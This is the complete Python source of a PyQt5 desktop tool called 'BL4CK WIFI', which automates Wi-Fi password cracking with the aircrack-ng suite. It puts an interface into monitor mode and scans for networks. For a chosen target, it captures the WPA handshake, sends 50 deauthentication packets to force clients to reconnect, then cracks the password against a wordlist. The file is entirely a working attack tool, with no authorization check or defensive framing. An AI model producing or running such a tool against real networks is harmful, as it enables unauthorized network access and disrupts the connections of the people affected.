import sys
import os
import subprocess
import tempfile
import threading
import time
from PyQt5.QtWidgets import (
    QApplication, QWidget, QPushButton, QVBoxLayout, QLabel, QFileDialog,
    QStackedWidget, QTableWidget, QTableWidgetItem, QTextEdit, QHeaderView,
    QMessageBox, QHBoxLayout
)
from PyQt5.QtCore import Qt, pyqtSignal, QObject


class Logger(QObject):
    log_signal = pyqtSignal(str)

class WifiCracker(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("BL4CK WIFI BY: WH04M1")
        self.setGeometry(100, 100, 1000, 600)
        self.setStyleSheet("background-color: black; color: white;")

        self.stack = QStackedWidget(self)
        layout = QVBoxLayout()
        layout.addWidget(self.stack)
        self.setLayout(layout)

        self.interface = None
        self.selected_network = None
        self.wordlist_path = None
        self.scan_process = None
        self.stop_scan_flag = False
        self.scan_file = None
        self.networks_seen = {}
        self.scan_thread = None

        
        self.logger = Logger()
        self.logger.log_signal.connect(self.append_log)

        self.create_interface_screen()
        self.create_main_menu()
        self.create_scan_screen()
        self.create_wordlist_screen()
        self.create_attack_screen()

        self.stack.setCurrentWidget(self.interface_screen)

    # ================= SCREEN 1 =================
    def create_interface_screen(self):
        self.interface_screen = QWidget()
        vbox = QVBoxLayout()
        label = QLabel("Select Wireless Interface")
        label.setAlignment(Qt.AlignCenter)
        label.setStyleSheet("font-size: 24px; color: lime;")
        vbox.addWidget(label)

        interfaces = self.get_interfaces()
        if not interfaces:
            vbox.addWidget(QLabel("No wireless interfaces found!"))
        else:
            for iface in interfaces:
                btn = QPushButton(iface)
                btn.setStyleSheet("background-color: blue; color: yellow; font-size: 18px;")
                btn.clicked.connect(lambda _, i=iface: self.set_interface(i))
                vbox.addWidget(btn)

        self.interface_screen.setLayout(vbox)
        self.stack.addWidget(self.interface_screen)

    def get_interfaces(self):
        result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True)
        lines = result.stdout.split("\n")
        interfaces = []
        for line in lines:
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces

    def set_interface(self, iface):
        self.interface = iface
        subprocess.call(["airmon-ng", "start", self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.interface += "mon"
        self.stack.setCurrentWidget(self.main_menu)

    # ================= SCREEN 2 =================
    def create_main_menu(self):
        self.main_menu = QWidget()
        vbox = QVBoxLayout()
        label = QLabel("BL4CK WIFI BY: WH04M1")
        label.setAlignment(Qt.AlignCenter)
        label.setStyleSheet("font-size: 26px; color: lime; font-weight: bold;")
        vbox.addWidget(label)

        start_scan_btn = QPushButton("Start Real-Time Scan")
        start_scan_btn.setStyleSheet("background-color: blue; color: yellow; font-size: 18px;")
        start_scan_btn.clicked.connect(lambda: self.stack.setCurrentWidget(self.scan_screen))
        vbox.addWidget(start_scan_btn)

        self.main_menu.setLayout(vbox)
        self.stack.addWidget(self.main_menu)

    # ================= SCREEN 3 =================
    def create_scan_screen(self):
        self.scan_screen = QWidget()
        vbox = QVBoxLayout()
        label = QLabel("Scanning...")
        label.setAlignment(Qt.AlignCenter)
        label.setStyleSheet("font-size: 18px; color: white;")
        vbox.addWidget(label)

        self.table = QTableWidget(0, 3)
        self.table.setHorizontalHeaderLabels(["ESSID", "BSSID", "POWER"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.setStyleSheet("background-color: #111; color: white; font-size: 14px;")
        self.table.cellDoubleClicked.connect(self.network_selected)
        vbox.addWidget(self.table)

        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("START SCAN")
        self.start_btn.setStyleSheet("background-color: green; color: white; font-size: 16px;")
        self.start_btn.clicked.connect(self.start_scan)
        btn_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("STOP SCAN")
        self.stop_btn.setStyleSheet("background-color: red; color: black; font-size: 16px;")
        self.stop_btn.clicked.connect(self.stop_scan)
        btn_layout.addWidget(self.stop_btn)

        vbox.addLayout(btn_layout)
        self.scan_screen.setLayout(vbox)
        self.stack.addWidget(self.scan_screen)

    def start_scan(self):
        self.stop_scan_flag = False
        self.networks_seen.clear()
        self.table.setRowCount(0)
        self.scan_file = tempfile.NamedTemporaryFile(delete=False).name
        cmd = ["airodump-ng", self.interface, "--write", self.scan_file, "--output-format", "csv"]
        self.scan_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.scan_thread = threading.Thread(target=self.update_table, daemon=True)
        self.scan_thread.start()

    def stop_scan(self):
        self.stop_scan_flag = True
        if self.scan_process:
            self.scan_process.terminate()
        QMessageBox.information(self, "Info", "Scan stopped. Double-click a network to continue.")

    def update_table(self):
        csv_file = self.scan_file + "-01.csv"
        while not self.stop_scan_flag:
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, "r", errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines:
                            if line.count(",") > 10 and "Station" not in line:
                                parts = line.split(",")
                                bssid = parts[0].strip()
                                channel = parts[3].strip()
                                power = parts[8].strip()
                                essid = parts[13].strip()
                                if essid and bssid not in self.networks_seen:
                                    self.networks_seen[bssid] = (essid, channel, power)
                                    self.add_table_row(essid, bssid, power)
                except:
                    pass
            time.sleep(1)

    def add_table_row(self, essid, bssid, power):
        row = self.table.rowCount()
        self.table.insertRow(row)
        essid_item = QTableWidgetItem(essid)
        essid_item.setForeground(Qt.red)
        bssid_item = QTableWidgetItem(bssid)
        bssid_item.setForeground(Qt.green)
        power_item = QTableWidgetItem(power)
        power_item.setForeground(Qt.yellow)
        self.table.setItem(row, 0, essid_item)
        self.table.setItem(row, 1, bssid_item)
        self.table.setItem(row, 2, power_item)

    def network_selected(self, row, col):
        essid = self.table.item(row, 0).text()
        bssid = self.table.item(row, 1).text()
        if bssid in self.networks_seen:
            _, channel, _ = self.networks_seen[bssid]
        else:
            channel = "6"  
        self.selected_network = (essid, bssid, channel)
        self.target_label.setText(f"Target: {essid} ({bssid}) CH: {channel}")
        self.stack.setCurrentWidget(self.wordlist_screen)

    # ================= SCREEN 4 =================
    def create_wordlist_screen(self):
        self.wordlist_screen = QWidget()
        vbox = QVBoxLayout()
        self.target_label = QLabel("Target: Network")
        self.target_label.setAlignment(Qt.AlignCenter)
        self.target_label.setStyleSheet("font-size: 18px; color: white;")
        vbox.addWidget(self.target_label)

        browse_btn = QPushButton("Browse Wordlist")
        browse_btn.setStyleSheet("background-color: blue; color: yellow; font-size: 16px;")
        browse_btn.clicked.connect(self.browse_wordlist)
        vbox.addWidget(browse_btn)

        crack_btn = QPushButton("Start Crack")
        crack_btn.setStyleSheet("background-color: red; color: white; font-size: 18px;")
        crack_btn.clicked.connect(lambda: self.stack.setCurrentWidget(self.attack_screen))
        vbox.addWidget(crack_btn)

        self.wordlist_screen.setLayout(vbox)
        self.stack.addWidget(self.wordlist_screen)

    def browse_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist")
        if path:
            self.wordlist_path = path
            QMessageBox.information(self, "Info", f"Wordlist selected: {path}")

    # ================= SCREEN 5 =================
    def create_attack_screen(self):
        self.attack_screen = QWidget()
        vbox = QVBoxLayout()
        label = QLabel("Attack Log")
        label.setAlignment(Qt.AlignCenter)
        label.setStyleSheet("font-size: 22px; color: lime;")
        vbox.addWidget(label)

        self.log_area = QTextEdit()
        self.log_area.setStyleSheet("background-color: black; color: lime; font-size: 14px;")
        self.log_area.setReadOnly(True)
        vbox.addWidget(self.log_area)

        start_btn = QPushButton("Start Attack")
        start_btn.setStyleSheet("background-color: green; color: white; font-size: 16px;")
        start_btn.clicked.connect(self.run_attack)
        vbox.addWidget(start_btn)

        self.attack_screen.setLayout(vbox)
        self.stack.addWidget(self.attack_screen)

    def append_log(self, text):
        self.log_area.append(text)
        self.log_area.ensureCursorVisible()

    def run_attack(self):
        threading.Thread(target=self.attack_process, daemon=True).start()

    def attack_process(self):
        essid, bssid, channel = self.selected_network
        iface = self.interface

        self.logger.log_signal.emit(f"[+] Target: {essid} ({bssid}) on channel {channel}")
        self.logger.log_signal.emit("[+] Setting channel...")
        subprocess.call(["iwconfig", iface, "channel", channel])

        capture_file = "/tmp/handshake"
        self.logger.log_signal.emit("[+] Starting to capture handshake for 90 seconds...")
        proc = subprocess.Popen(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", capture_file, iface],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Increased capture duration
        time.sleep(90)

        self.logger.log_signal.emit("[+] Sending Deauth packets...")
        subprocess.call(["aireplay-ng", "-0", "50", "-a", bssid, iface], stdout=subprocess.DEVNULL)

        self.logger.log_signal.emit("[+] Stop capturing...")
        proc.terminate()

        self.logger.log_signal.emit("[+] Cracking the password...")
        cmd = ["aircrack-ng", "-w", self.wordlist_path, "-b", bssid, capture_file + "-01.cap"]
        crack_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        for line in crack_proc.stdout:
            self.logger.log_signal.emit(line.strip())

        self.logger.log_signal.emit("[+] Attack Complete!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = WifiCracker()
    window.show()
    sys.exit(app.exec_())
